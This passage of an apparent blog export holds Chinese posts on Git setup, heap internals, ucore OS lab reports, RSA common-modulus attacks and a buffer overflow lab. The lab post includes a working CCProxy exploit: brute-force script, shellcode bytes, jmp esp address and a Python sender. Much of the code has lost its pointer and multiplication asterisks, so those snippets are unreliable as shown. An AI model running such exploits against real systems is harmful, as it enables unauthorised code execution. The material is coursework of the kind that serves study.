(publickey).则说明可以连接。否则需要安装SSH 第一步执行ssh-keygen -t rsa -C “你自己的github对应的邮箱地址”语句注1：“”是需要的！ 注2：是在ssh目录下进行的！ 发现，id_rsa（私钥）和id_rsa.pub（公钥）这两个文件被创建了 （通过ls查看～/.ssh下面的所有内容查看）第二步将刚刚创建的ssh keys添加到github中 （1）利用gedit/cat命令，查看id_rsa.pub的内容 （2）在GitHub中，依次点击Settings -&gt; SSH Keys -&gt; Add SSH Key，将id_rsa.pub文件中的字符串复制进去，注意字符串中没有换行和空格。第三步再次检查SSH连接情况（在～/.ssh目录下）： 输入如下命令： ssh -T git@github.com 如果看到如下所示，则表示添加成功： Hi alioth310! You’ve successfully authenticated, but GitHub does not provide shell access.至此本地仓库与远程仓库的连接创建完成。0x1 拥有自己的Github账号 一个全新的ubunt系统，需要安装Git（系统是不具有该工具的），方法如下： 在terminel中输入如下命令： sudo apt-get install git git-core git-gui git-doc git-svn git-cvs gitweb gitk git-email git-daemon-run git-el git-arch110x2 建立仓库（仓库名字可以不和Github上的一样） 0x3 配置本地信息下图是Github上建立完仓库之后给的信息 下面我们按照他的信息提示一步一步建立yz@yz-ThinkPad-T430s:~/Git/test$ echo 123 &gt; readme.mdyz@yz-ThinkPad-T430s:~/Git/test$ git add .yz@yz-ThinkPad-T430s:~/Git/test$ git commit -m“first”yz@yz-ThinkPad-T430s:~/Git/test$ git remote add origin git@github.com:actionyz/just_test.gityz@yz-ThinkPad-T430s:~/Git/test$ git push –set-upstream origin master0x02 Git使用0x0 Git命令简介 上图很直观详细的说明了git命令之间的关系 Git在本地 主要分为工作区、stage、master三个阶段0x1 图解Git分支 上面的四条命令在工作目录、暂存目录(也叫做索引)和仓库之间复制文件。git add files 把当前文件放入暂存区域。 git commit 给暂存区域生成快照并提交。 git reset –files 用来撤销最后一次git add files，你也可以用git reset 撤销所有暂存区域文件。 git checkout – files 把文件从暂存区域复制到工作目录，用来丢弃本地修改。git commit -a 相当于运行 git add 把所有当前目录下的文件加入暂存区域再运行。git commit. git commit files 进行一次包含最后一次提交加上工作目录中文件快照的提交。并且文件被添加到暂存区域。git checkout HEAD – files 回滚到复制最后一次提交绿色的5位字符表示提交的ID，分别指向父节点。分支用橘色显示，分别指向特定的提交。当前分支由附在其上的HEAD标识。 这张图片里显示最后5次提交，ed489是最新提交。 master分支指向此次提交，另一个maint分支指向祖父提交节点。0x2 命令详解DIff有许多种方法查看两次提交之间的变动。下面是一些示例。 Commit提交时，git用暂存区域的文件创建一个新的提交，并把此时的节点设为父节点。然后把当前分支指向新的提交节点。下图中，当前分支是master。 在运行命令之前，master指向ed489，提交后，master指向新的节点f0cec并以ed489作为父节点。即便当前分支是某次提交的祖父节点，git会同样操作。下图中，在master分支的祖父节点maint分支进行一次提交，生成了1800b。 这样，maint分支就不再是master分支的祖父节点。此时，合并 (或者 衍合) 是必须的。如果想更改一次提交，使用 git commit –amend。git会使用与当前提交相同的父节点进行一次新提交，旧的提交会被取消。 Resetreset命令把当前分支指向另一个位置，并且有选择的变动工作目录和索引。也用来在从历史仓库中复制文件到索引，而不动工作目录。 如果不给选项，那么当前分支指向到那个提交。如果用–hard选项，那么工作目录也更新，如果用–soft选项，那么都不变。如果没有给出提交点的版本号，那么默认用HEAD。这样，分支指向不变，但是索引会回滚到最后一次提交，如果用–hard选项，工作目录也同样。如果给了文件名(或者 -p选项), 那么工作效果和带文件名的checkout差不多，除了索引被更新。紧接着强制推送到远程分支： git push -f指令先写这么多如果以后用到在继续更新]]></content>
      <tags>
        <tag>软件及应用配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆溢出利用]]></title>
    <url>%2F2017%2F05%2F02%2F%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[堆的工作原理与利用 0x00 堆的工作原理0x0 数据结构堆块堆表0x1 申请0x2 使用0x3 释放0x00 堆的工作原理0x0 数据结构堆块堆块包括块首与块身（返回的指针指向），块首是一个堆块头部的几个字节，用来标识这个堆块自身的信息。 未被占用的堆区 被占用的堆区堆表位于堆区的起始位置，堆表分为两种空闲双向链表Freelist（空表 128条）和快速单向链表Lookaside（快表 最多只有四项）堆区一开始的堆表区中有一个128项的指针数组（看到有人说把它看成队列的），被称作空表索引。该数组的每一项包含两个指针，用于表示一条空表。 free[1] 标识了所有堆中所有大小为8字节的空闲堆块，之后每个索引指示的空闲堆块递增8个字节。即： free[2]标识了16个字节的空闲堆块。 free[k] 标识了 k * 8 个字节的空闲堆块。 空闲双向链表Freelist（空表） 快速单向链表Lookaside（快表）0x1 申请堆块的分配有三类： - 块表分配 - 普通表份分配 - 零号表分配（free[0]）堆的申请首先在快表中查询，如果没有去普通表中查询，如果还没有从内存空间分配。0x2 使用直接利用堆表中的指针查询堆块，利用返回的指针使用堆内存，并对其操作。0x3 释放堆的释放首先释放在快表中，如果快表满了再释放到普通表中。空表 内存分布0x00520178 Freelist[0]0x00520188 Freelist[1]0x00520198 Freelist[2]0x005201a8 Freelist[3]块区0x00520680 h1 (加上8byte头字节)0x00520690 h20x005206a0 h30x005206b0 h4快表 内存分布0x003606E8 Lookaside[1]0x00360718 Lookaside[2]0x00360748 Lookaside[3]0x00360788 Lookaside[4]堆区0x00361E98 h10x00361Ea8 h30x00361E98 h5]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统实验报告 lab4]]></title>
    <url>%2F2017%2F04%2F30%2F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab4%2F</url>
    <content type="text"><![CDATA[操作系统实验报告 lab4 练习0 填写已有实验练习1 分配并初始化一个进程控制块需要编码关键数据结构 struct proc_struct代码填写context和tf的作用分析练习2 为新创建的内核线程分配资源执行步骤代码填写练习3 理解proc_run和它调用的函数如何完成进程切换的schedule代码分析proc_run代码分析switch_to函数分析运行截图实验总结练习0 填写已有实验本实验依赖实验1～实验3。请把已做的实验1～实验3的代码填入本实验中代码中有lab1，lab2，lab3的注释部分。运用meld软件进行比较，截图如下： 可以看到，需要补全的文件是default_pmm.cpmm.cswap_fifo.cvmm.ctrap.c练习1 分配并初始化一个进程控制块（需要编码）alloc_proc函数（位于kern/process/proc.c中）负责分配并返回一个新的struct proc_struct结构，用于存储新建立的内核线程的管理信息。ucore需要对这个结构进行最基本的初始化，完成这个初始化过程。关键数据结构 struct proc_struct struct proc_struct { enum proc_state state; // Process state int pid; // Process ID int runs; // the running times of Proces uintptr_t kstack; // Process kernel stack volatile bool need_resched; // need to be rescheduled to release CPU? struct proc_struct parent; // the parent process struct mm_struct mm; // Process’s memory management field struct context context; // Switch here to run process struct trapframe tf; // Trap frame for current interrupt uintptr_t cr3; // the base addr of Page Directroy Table(PDT) uint32_t flags; // Process flag char name[PROC_NAME_LEN + 1]; // Process name list_entry_t list_link; // Process link list list_entry_t hash_link; // Process hash list }; 下面对参数进行简单的讲解mm：内存管理的信息，包括内存映射列表、页表指针等。 state：进程所处的状态。 parent：用户进程的父进程（创建它的进程）。 kstack：记录了分配给该进程/线程的内核桟的位置。 need_resched：是否需要调度 context：进程的上下文，用于进程切换 tf：中断帧的指针 cr3: cr3 保存页表的物理地址代码填写根据题目中的提示填写代码 static struct proc_struct alloc_proc(void) { struct proc_struct proc = kmalloc(sizeof(struct proc_struct)); if (proc != NULL) { //LAB4:EXERCISE1 YOUR CODE / below fields in proc_struct need to be initialized enum proc_state state; // Process state int pid; // Process ID int runs; // the running times of Proces uintptr_t kstack; // Process kernel stack volatile bool need_resched; // bool value: need to be rescheduled to release CPU? struct proc_struct parent; // the parent process struct mm_struct mm; // Process’s memory management field struct context context; // Switch here to run process struct trapframe tf; // Trap frame for current interrupt uintptr_t cr3; // CR3 register: the base addr of Page Directroy Table(PDT) uint32_t flags; // Process flag char name[PROC_NAME_LEN + 1]; // Process name / proc-&gt;state = PROC_UNINIT; //设置进程为“初始”态 proc-&gt;pid = -1; //设置进程pid的未初始化值 proc-&gt;runs = 0;//初始化时间片 proc-&gt;kstack = 0;//内核栈的地址 proc-&gt;need_resched = 0;//是否需要调度 proc-&gt;parent = NULL;//父节点为空 proc-&gt;mm = NULL; //内存管理初始化 memset(&amp;(proc-&gt;context), 0, sizeof(struct context));//进程上下文初始化 proc-&gt;tf = NULL; //中断帧指针置为空，总是能够指向中断前的trapframe proc-&gt;cr3 = boot_cr3;//设置内核页目录表的基址 proc-&gt;flags = 0; //标志位初始化 memset(proc-&gt;name, 0, PROC_NAME_LEN); //进程名初始化 } return proc; } context和tf的作用分析①context：进程的上下文，用于进程切换。起到的作用就是保存了现场。在 ucore中，所有的进程在内核中也是相对独立的，因此context 保存寄存器的目的就在于在内核态中能够进行上下文之间的切换。实际利用context进行上下文切换的函数是在kern/process/switch.S中定义switch_to。② tf：中断帧的指针，总是指向内核栈的某个位置：当进程从用户空间跳到内核空间时，中断帧记录了进程在被中断前的状态。当内核需要跳回用户空间时，需要调整中断帧以恢复让进程继续执行的各寄存器值。除此之外，ucore内核允许嵌套中断。因此为了保证嵌套中断发生时tf 总是能够指向当前的tf，ucore 在内核栈上维护了 tf 的链。练习2 为新创建的内核线程分配资源创建一个内核线程需要分配和设置好很多资源。kernel_thread函数通过调用do_fork函数完成具体内核线程的创建工作。do_kernel函数会调用alloc_proc函数来分配并初始化一个进程控制块，但alloc_proc只是找到了一小块内存用以记录进程的必要信息，并没有实际分配这些资源。ucore一般通过do_fork实际创建新的内核线程。do_fork的作用是，创建当前内核线程的一个副本，它们的执行上下文、代码、数据都一样，但是存储位置不同。在这个过程中，需要给新内核线程分配资源，并且复制原进程的状态。完成在kern/process/proc.c中的do_fork函数中的处理过程。执行步骤①调用alloc_proc，首先获得一块用户信息块。 ②为进程分配一个内核栈。 ③复制原进程的内存管理信息到新进程（但内核线程不必做此事） ④复制原进程上下文到新进程 ⑤将新进程添加到进程列表 ⑥唤醒新进程 ⑦返回新进程号（设置子进程号为返回值）代码填写根据代码提示填写代码如下，同时标注了对于代码的认识理解 int do_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe tf) { int ret = -E_NO_FREE_PROC; struct proc_struct proc; if (nr_process &gt;= MAX_PROCESS) { goto fork_out; } ret = -E_NO_MEM; //LAB4:EXERCISE2 YOUR CODE / Some Useful MACROs, Functions and DEFINEs, you can use them in below implementation. MACROs or Functions: alloc_proc: create a proc struct and init fields (lab4:exercise1) setup_kstack: alloc pages with size KSTACKPAGE as process kernel stack copy_mm: process “proc” duplicate OR share process “current”‘s mm according clone_flags if clone_flags &amp; CLONE_VM, then “share” ; else “duplicate” copy_thread: setup the trapframe on the process’s kernel stack top and setup the kernel entry point and stack of process hash_proc: add proc into proc hash_list get_pid: alloc a unique pid for process wakup_proc: set proc-&gt;state = PROC_RUNNABLE VARIABLES: proc_list: the process set’s list nr_process: the number of process set / // 1. call alloc_proc to allocate a proc_struct // 2. call setup_kstack to allocate a kernel stack for child process // 3. call copy_mm to dup OR share mm according clone_flag // 4. call copy_thread to setup tf &amp; context in proc_struct // 5. insert proc_struct into hash_list &amp;&amp; proc_list // 6. call wakup_proc to make the new child process RUNNABLE // 7. set ret vaule using child proc’s pid //第一步：申请内存块，如果失败，直接返回处理 if ((proc = alloc_proc()) == NULL) { goto fork_out; } //将子进程的父节点设置为当前进程 proc-&gt;parent = current; //第二步：为进程分配一个内核栈 if (setup_kstack(proc) != 0) { goto bad_fork_cleanup_proc; } //第三步：复制父进程的内存信息到子进程 if (copy_mm(clone_flags, proc) != 0) { goto bad_fork_cleanup_kstack; } //第四步：复制父进程相关寄存器信息（上下文） copy_thread(proc, stack, tf); //第五步：将新进程添加到进程列表（此过程需要加保护锁） bool intr_flag; local_intr_save(intr_flag); { proc-&gt;pid = get_pid(); //建立散列映射方便查找 hash_proc(proc); //将进程链节点加入进程列表 list_add(&amp;proc_list, &amp;(proc-&gt;list_link)); //进程数+1 nr_process ++; } local_intr_restore(intr_flag); //第六步：一切准备就绪，唤醒子进程 wakeup_proc(proc); //第七步：别忘了设置返回的子进程号 ret = proc-&gt;pid; fork_out: return ret; bad_fork_cleanup_kstack: put_kstack(proc); bad_fork_cleanup_proc: kfree(proc); goto fork_out; } 在使用 fork 或 clone 系统调用时产生的进程均会由内核分配一个新的唯一的PID值。 具体来说，就是在分配PID时，设置一个保护锁，暂时不允许中断，保证了ID的唯一性。上述操作真正完成了资源分配的工作，与第一步中的工作有着明显的区别。do_fork只是创建当前进程的副本，他们执行的上下文，寄存器，代码都是一样的。练习3 理解proc_run和它调用的函数如何完成进程切换的schedule代码分析在分析 proc_run 函数之前，我们先分析调度函数 schedule() 。 schedule()代码如下：voidschedule(void) { bool intr_flag; list_entry_t le, last; struct proc_struct next = NULL; local_intr_save(intr_flag); { current-&gt;need_resched = 0; last = (current == idleproc) ? &amp;proc_list : &amp;(current-&gt;list_link); le = last; do { if ((le = list_next(le)) != &amp;proc_list) { next = le2proc(le, list_link); if (next-&gt;state == PROC_RUNNABLE) { break; } } } while (le != last); if (next == NULL || next-&gt;state != PROC_RUNNABLE) { next = idleproc; } next-&gt;runs ++; if (next != current) { proc_run(next); } } local_intr_restore(intr_flag);}简单介绍一下schedule的执行过程： ①设置当前内核线程current-&gt;need_resched为0； ②proc_list队列存储着所有状态的进程/线程，在其中查找下一个处于“就绪”态的线程或进程next； ③找到这样的进程后，就调用proc_run函数，保存当前进程current的执行现场（进程上下文），恢复新进程的执行现场，完成进程切换。 至此，新的进程next就开始执行了。由于在proc10中只有两个内核线程，且idleproc要让出CPU给initproc执行，我们可以看到schedule函数通过查找proc_list进程队列，只能找到一个处于“就绪”态的initproc内核线程。proc_run代码分析void proc_run(struct proc_struct proc) { if (proc != current) { bool intr_flag; struct proc_struct prev = current, next = proc; local_intr_save(intr_flag); { current = proc; load_esp0(next-&gt;kstack + KSTACKSIZE); lcr3(next-&gt;cr3); switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context)); } local_intr_restore(intr_flag); }}通过proc_run和进一步的switch_to函数完成两个执行现场的切换，具体流程如下： ①让current指向next内核线程initproc； ②设置任务状态段ts中特权态0下的栈顶指针esp0为next内核线程initproc的内核栈的栈顶，即next-&gt;kstack + KSTACKSIZE ； ③设置CR3寄存器的值为next内核线程initproc的页目录表起始地址next-&gt;cr3，这实际上是完成进程间的页表切换； 由switch_to函数完成具体的两个线程的执行现场切换，即切换各个寄存器，当switch_to函数执行完“ret”指令后，就切换到initproc执行了。switch_to函数分析switch_to函数的执行流程：.globl switch_toswitch_to: # switch_to(from, to) # 保存前一个进程的执行现场，前两条汇编指令（如下所示）保存了进程在返回switch_to函数后的指令地址到context.eip中 movl 4(%esp), %eax # eax points to from popl 0(%eax) # esp–&gt; return address, so save return addr in FROM’s # 保存前一个进程的其他7个寄存器到context中的相应成员变量中。 movl %esp, 4(%eax)movl %ebx, 8(%eax)movl %ecx, 12(%eax)movl %edx, 16(%eax)movl %esi, 20(%eax)movl %edi, 24(%eax)movl %ebp, 28(%eax)#再往后是恢复向一个进程的执行现场，这其实就是上述保存过程的逆执行过程，即从 context 的高地址的域 ebp 开始，逐一把相关域的值赋值给对应的寄存器。设置了initproc-&gt;context.eip = (uintptr_t)forkret，这样，当执行switch_to函数并返回后，initproc将执行其实际上的执行入口地址forkret。运行截图实验总结本次实验主要针对内核线程的管理，所有内核线程直接使用共同的ucore内核内存空间，而用户进程需要维护各自的用户内存空间。以及了解到了进程切换的相关细节操作，更加深一步的了解了操作系统。]]></content>
      <tags>
        <tag>操作系统实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统实验报告 lab3]]></title>
    <url>%2F2017%2F04%2F24%2F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab3%2F</url>
    <content type="text"><![CDATA[操作系统实验报告 lab3 操作系统实验报告 lab3 目录：操作系统实验报告 lab3 练习0 填写已有实验练习1 给未被映射的地址映射上物理页问题分析结构体分析vma_structmm_struct管理结构关系实现代码练习2 补充完成基于FIFO的页面替换算法问题分析函数分析实现代码实验截图总结本次实验主要完成ucore内核对虚拟内存的管理工作。首先完成初始化虚拟内存管理机制，即需要设置好哪些页需要放在物理内存中，哪些页不需要放在物理内存中，而是可被换出到硬盘上，并涉及完善建立页表映射、页错误异常处理操作等函数实现。最后测试编写的代码有没有达到预期的效果。整体的实验不难，但需要掌握一些数据结构之间的关系，这样对理解虚拟内存管理有很大的帮助。练习0 填写已有实验将实验二代码补全至实验三在这里了仍然采用meld工具直接进行比较，截图如下 图1 文件夹对比总共需要修改的文件有三个default_pmm.cpmm.ctrap.c将代码直接从lab2复制至lab3，修改完之后进入下面的实验练习1 给未被映射的地址映射上物理页完成 do_pgfault函数,给未被映射的地址映射上物理页。设置访问权限的时候要参考所在页面的VMA权限，同时需要注意映射物理页时需要操作内存控制结构指定的页表，而不是内核页表1 问题分析：当启动分页机制以后，如果一条指令或数据的虚拟地址所对应的物理页不在内存中，或者访问权限不够，那么就会产生页错误异常。其具体原因有以下三点：页表项全为0——虚拟地址与物理地址未建立映射关系或已被撤销。物理页面不在内存中——需要进行换页机制。访问权限不够——应当报错。当出现上面情况之一,那么就会产生页面page fault(#PF)异常。产生异常的线性地址存储在 CR2中,并且将是page fault的产生类型保存在 error code 中2 结构体分析vma_struct每个进程只有一个mm_struct结构，在每个进程的task_struct结构体中，有一个指向该进程的结构。可以说，mm_struct结构是对整个用户空间的描述。 struct vma_struct { // the set of vma using the same PDT struct mm_struct vm_mm; uintptr_t vm_start; // start addr of vma uintptr_t vm_end; // end addr of vma uint32_t vm_flags; // flags of vma //linear list link which sorted by start addr of vma list_entry_t list_link; }; 1.vm_start和vm_end描述的是一个合理的地址空间范围（即严格确保 vm_start &lt; vm_end的关系）； 2.list_link是一个双向链表，按照从小到大的顺序把一系列用vma_struct表示的虚拟内存空间链接起来，并且还要求这些链起来的vma_struct应该是不相交的，即vma之间的地址空间无交集； 3.vm_flags表示了这个虚拟内存空间的属性，目前的属性包括 #define VM_READ 0x00000001 //只读 #define VM_WRITE 0x00000002 //可读写 #define VM_EXEC 0x00000004 //可执行 4.vm_mm是一个指针，指向一个比vma_struct更高的抽象层次的数据结构mm_structmm_struct较高层次的结构vm_area_struct描述了虚拟地址空间的一个区间(简称虚拟区)。 struct mm_struct { // linear list link which sorted by start addr of vma list_entry_t mmap_list; // current accessed vma, used for speed purpose struct vma_struct mmap_cache; pde_t pgdir; // the PDT of these vma int map_count; // the count of these vma void sm_priv; // the private data for swap manager }; 1.mmap_list是双向链表头，链接了所有属于同一页目录表的虚拟内存空间 2.mmap_cache是指向当前正在使用的虚拟内存空间 3.pgdir所指向的就是 mm_struct数据结构所维护的页表 4.map_count记录mmap_list里面链接的vma_struct的个数 5.sm_priv指向用来链接记录页访问情况的链表头3 管理结构关系在进程的task_struct结构中包含一个指向 mm_struct结构的指针，mm_strcut用来描述一个进程的虚拟地址空间。 进程的 mm_struct 则包含装入的可执行映像信息以及进程的页目录指针pgd。该结构还包含有指向 vm_area_struct 结构的几个指针. 每个vm_area_struct 代表进程的一个虚拟地址区间。vm_area_struct 结构含有指向vm_operations_struct 结构的一个指针，vm_operations_struct 描述了在这个区间的操作。vm_operations 结构中包含的是函数指针；其中，open、close 分别用于虚拟区间的打开、关闭，而nopage 用于当虚存页面不在物理内存而引起的“缺页异常”时所应该调用的函数，当 Linux 处理这一缺页异常时（请页机制），就可以为新的虚拟内存区分配实际的物理内存。 图2 管理结构图 图3 关系图实现代码1.目标页面不存在（页表项全为0，即该线性地址与物理地址尚未建立映射或者已经撤销）;2.相应的物理页面不在内存中（页表项非空，但Present标志位=0，比如在swap分区或磁盘文件上）3.访问权限不符合（此时页表项P标志=1，比如企图写只读页面）.int do_pgfault(struct mm_struct mm,uint32_t error_code,uintptr addr){ pte_t ptep=NULL;//页目录 if ((ptep = get_pte(mm-&gt;pgdir, addr, 1)) == NULL) { //查找页目录 如果不存在则失败 cprintf(“get_pte in do_pgfault failed\n”); goto failed; } if (ptep == 0) { //如果物理地址不存在，那么分配一个物理页 并且与虚拟内存建立对应关系 if (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == NULL) { cprintf(“pgdir_alloc_page in do_pgfault failed\n”); goto failed; } } else { //页表项非空，可以尝试换入页面 if(swap_init_ok) { struct Page page=NULL;//新建内存页指针 if ((ret = swap_in(mm, addr, &amp;page)) != 0) {//根据mm结构和addr地址，尝试将硬盘中的内容换入至page中 cprintf(“swap_in in do_pgfault failed\n”); goto failed; } page_insert(mm-&gt;pgdir, page, addr, perm);//建立虚拟地址和物理地址之间的对应关系 swap_map_swappable(mm, addr, page, 1);//将此页面设置为可交换的 page-&gt;pra_vaddr = addr; } else { cprintf(“no swap_init_ok but ptep is %x, failed\n”,ptep); goto failed; } } ret = 0 failed: return ret;}练习2 补充完成基于FIFO()的页面替换算法完成vmm.c中的do_pgfault函数，并且在实现FIFO算法的swap_fifo.c中完成map_swappable和swap_out_vistim函数。通过对swap的测试。问题分析根据练习1，当页错误异常发生时，有可能是因为页面保存在swap区或者磁盘文件上造成的，练习2需要利用页面替换算法解决这个问题。函数分析map_swappable() 主要解决的问题是将最近被用到的页面添加到算法所维护的次序队列。 链表是由list_entry_t指针串起来的 mm_struct结构体的sm_priv元素是交换管理的私有数据 是一串链表 满足FIFO先进先出_fifo_swap_out_victim()函数是用来查询哪个页面需要被换出，它的主要作用是用来查询哪个页面需要被换出。实现代码_fifo_map_swappable()static int _fifo_map_swappable(struct mm_struct mm, uintptr_t addr, struct Page page, int swap_in) { list_entry_t head=(list_entry_t) mm-&gt;sm_priv; list_entry_t entry=&amp;(page-&gt;pra_page_link); assert(entry != NULL &amp;&amp; head != NULL); list_add(head, entry); //将最近用到的页面添加到次序队尾 return 0; } _fifo_swap_out_victim()static int_fifo_swap_out_victim(struct mm_struct mm, struct Page ** ptr_page, int in_tick) { list_entry_t head=(list_entry_t) mm-&gt;sm_priv; assert(head != NULL); assert(in_tick==0); list_entry_t le = head-&gt;prev; //用le指示需要被换出的页，最先进入队列的元素head的另一端 assert(head!=le); struct Page p = le2page(le, pra_page_link);//le2page宏可以根据链表元素获得对应的Page指针p 这里是物理页属性 list_del(le); //将进来最早的页面从队列中删除 assert(p !=NULL); ptr_page = p; //将这一页的地址存储在ptr_page中 return 0;}实验截图 图4 实验效果图check_vma_struct() succeeded!page fault at 0x00000100: K/W [no page found].check_pgfault() succeeded!check_vmm() succeeded. 图5 实验效果图check_swap() succeeded! 实验运行成功！总结1.整个实验下来感觉自己收获很多，通过上网查找资料，自己深刻学习了虚拟内存管理的机制，通过实验更是加深了印象。 2.实验中遇到了很多的问题，比如进程虚拟内存的管理涉及到的一些结构体的关系，由于种类比较多很容易混乱，通过列图梳理了他们之间的关系。 3.操作系统这门课程比较基础，涉及到的内容比较多。有时学起来会比较吃力，但这门课程非常重要，是以后专业课的基石，希望在以后自己留给更多的时间在做实验上，从而更加深入的理解、掌握操作系统]]></content>
      <tags>
        <tag>操作系统实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓冲区溢出实验]]></title>
    <url>%2F2017%2F04%2F22%2F%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。 0x01 缓冲区溢出简介0x02 实验要求0x03 实验内容0x1 定位溢出点0x2 IDA查看溢出函数0x3 溢出调试0x4 编写shellcode0x5 发送shellcode0x04 问题0x05 实验总结0x01 缓冲区溢出简介缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。0x02 实验要求1.请对stackoverflow.exe和CCProxy.rar的溢出点（即输入数据长度为多少时，程序会发生溢出）进行定位。 2.根据你定位的溢出点，思考：如果你的Shellcode长度为500字节，那么在两种情况下，Shellcode放在参数的什么位置比较有利用执行？ 3.在以上基础上完成一次shellcode的植入与运行。 要求 (1)Shellcode功能不限，可以是开端口、运行计算器（记事本）、添加帐号等 均可。 (2)Shellcode要求能够以参数的方式植入并覆盖栈空间。 (3）返回地址的EIP处只能填写jmp esp指令地址，不得填写shellcode的地址硬编码。0x03 实验内容0x1 定位溢出点stackoverflow 图1 用OD调试程序找到程序执行的地方，并下断点 图2 在程序入口下断点在OD中找到栈溢出的地方 图3 堆栈情况在上图中发现输入长度为20个字节的时候正好能将ret地址覆盖 当长度为16字节时（最后有截断字符0x00 地址变为了0x401100）恰好能将返回地址设置到程序执行前，以此来实现重复执行。 图4 输入长度为16利用IDA反汇编的结果，可以直接看到产生溢出的函数 图5 反汇编 发现产生溢出的strcpy函数，因为程序没有对argv的长度进行限制CCproxy特定字符s = ‘’for i in range(10): for j in range(10): for m in range(10): for(n) in range(10): s += str(i)+str(j)+str(m)+str(n) if len(s) == 2000 : print s生成字节序不同的2000个字节 图6 生成不同字节 图7 OD堆栈可以看到EIP的值前面是高字节后面是低字节 则为0253 图8 搜索字符长度为1012位脚本爆破import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((“192.168.43.254”, 23))num = 15while 1: s.send(‘ping’+‘A’num+‘\n’) #000a0d42 1013 0a0d4242 1014 0042000a 1011 string = s.recv(4096) print string if ‘Host’ in string or ‘CCProxy’ in string or ‘be’ in string: strtt = 1 else: print ‘no’ print num num += 1 图9 爆破寻找0x2 IDA查看溢出函数利用IDA字符串搜索Host not found查找溢出函数位置 图10 寻找溢出函数0x3 溢出调试首先根据IDA的静态分析设置调试断点0x430524 发送2000个字节 图11 堆栈情况发现程序只拷贝1024个字节后面再长的字节都会被前面的覆盖0x4 编写shellcode1.找到messagebox的函数地址 利用自己编写的弹窗函数寻找 图12 寻找地址0x77D507EAjmp esp地址选用\x12\x45\xfa\x7f messagebox函数的参数有四个33 DB XOR EBX,EBX 压入NULL结尾的”failwest”字符串。之所以用EBX清零后入栈做为字符串的截断符，是为了避免“PUSH 0”中的NULL，否则植入的机器码会被strcpy函数截断。53 PUSH EBX68 77 65 73 74 PUSH 7473657768 66 61 69 6C PUSH 6C6961668B C4 MOV EAX,ESP EAX里是字符串指针53 PUSH EBX 四个参数按照从右向左的顺序入栈，分别为: (0,failwest,failwest,0)50 PUSH EAX50 PUSH EAX53 PUSH EBXB8 EA 04 D8 77 MOV EAX, 0x77D804EA 调用MessageBoxA。注意不同的机器这里的 函数入口地址可能不同，请按实际值填入!FF D0 CALL EAX 0x5 发送shellcode下面利用python socket连接CCproxyimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((“192.168.43.254”, 23))string = s.recv(4096)print strings.send(‘ping’ +‘\x90\x90\x90\x90’ +‘\x53\x68\x79\x71\x20\x20\x68\x68\x61\x63\x6b\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77\xFF\xD0’ +‘\x41’984 +‘\x12\x45\xfa\x7f’ +‘\x91\x92\x93\x94\x95\x96\x97\x98\x99\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90’+‘\r\n’)string = s.recv(4096)print string测试效果 图13 shellcode效果0x04 问题虽然知道了溢出是函数sprintf造成的，但是还是不了解为什么只复制了1024个字节，后面的又被前面的覆盖掉了。0x05 实验总结缓冲区溢出的实验是我对程序溢出利用有了深刻的认识理解，通过调试软件漏洞大大增长了自己的动手实践能力。同时还找到了自己不足的方面。希望在以后的学习中更加丰富自己。]]></content>
      <tags>
        <tag>逆向工程分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA 常见攻击方法]]></title>
    <url>%2F2017%2F04%2F22%2FRSA%20%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[0x01 RSA简介 那么，有无可能在已知n和e的情况下，推导出d？ 首先要知道 （1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。 （2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。 （3）n=pq。只有将n因数分解，才能算出p和q。 结论：如果n可以被因数分解，d就可以算出，也就意 0x01 RSA简介那么，有无可能在已知n和e的情况下，推导出d？ 首先要知道 （1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。 （2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。 （3）n=pq。只有将n因数分解，才能算出p和q。 结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。0x02 常见的RSA攻击方法0x1 共模攻击共模攻击，也称同模攻击，英文原名是 Common Modulus Attack 。 同模攻击利用的大前提就是，RSA体系在生成密钥的过程中使用了相同的模数n。 假设COMPANY用所有公钥加密了同一条信息M，也就是 c1 = m^e1%n c2 = m^e2%n 此时员工A拥有密钥d1他可以通过 m = c1^d1%n 解密得到消息m 同时员工B拥有密钥d2 他可以通过 m = c2^d2%n 解密得到消息m如果，此时有一个攻击者，同时监听了A和B接收到的密文C1,C2，因为模数不变，以及所有公钥都是公开的，那么利用同模攻击，他就可以在不知道d1，d2的情况下解密得到消息m。 